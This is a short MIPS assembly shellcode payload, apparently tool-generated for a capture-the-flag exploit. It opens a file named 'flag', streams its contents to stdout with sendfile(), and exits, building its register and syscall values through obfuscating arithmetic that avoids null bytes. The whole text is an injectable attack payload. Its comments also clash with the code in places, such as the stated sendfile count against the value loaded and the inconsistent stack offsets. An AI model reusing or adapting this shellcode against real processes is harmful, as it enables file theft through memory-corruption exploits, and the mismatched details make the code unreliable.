    /* push 'flag\x00' */
    li $t1, 0x67616c66
    sw $t1,-7824($sp)
    sw $zero,-7820($sp)
    addiu $sp, $sp, 0x84e4
    /* open(file='$sp', oflag=0, mode=0) */
    addiu $v1, $sp, 0x84e4 /* mov $a0, addr('flag') */
    addiu $v1, $v1, 0x3655
    addiu $v1, $v1, 0x3655
    addiu $v1, $v1, 0x357f
    addiu $a0, $v1, 0x357f
    slti $a1, $zero, 0x80d0 /* $a1 = 0 */
    slti $a2, $zero, 0x80d0 /* $a2 = 0 */
    /* call open() */
    /*SYS_open = 0xfa5 */
    slti $v0, $zero, 0x80d0 /* $v0 = 0 */
    addi $v0, $v0, 0x42e
    addi $v0, $v0, 0x42e
    addi $v0, $v0, 0x42e
    addi $v0, $v0, 0x31b
    syscall 0x40404
    /* sendfile(out_fd=1, in_fd='$v0', offset=0, count=2147483647) */
    slti $a0, $zero, 0x101 /* $a0 = 1 */
    sw $v0, -32524($sp)
    lw $a1, -32524($sp) /* a1 = $v0 = fd */
    slti $a2, $zero, 0x80d0 /* $a2 = 0 */
    li $a3, 0x7070
    /* call sendfile() */
    ori $v0, $zero, SYS_sendfile
    syscall 0x40404
    /* exit(status=0) */
    slti $a0, $zero, 0x80d0 /* $a0 = 0 */
    /* call exit() */
    /*SYS_exit = 0xfa1 */
    slti $v0, $zero, 0x80d0 /* $v0 = 0 */
    addi $v0, $v0, 0x42e
    addi $v0, $v0, 0x42e
    addi $v0, $v0, 0x42e
    addi $v0, $v0, 0x317
    syscall 0x40404
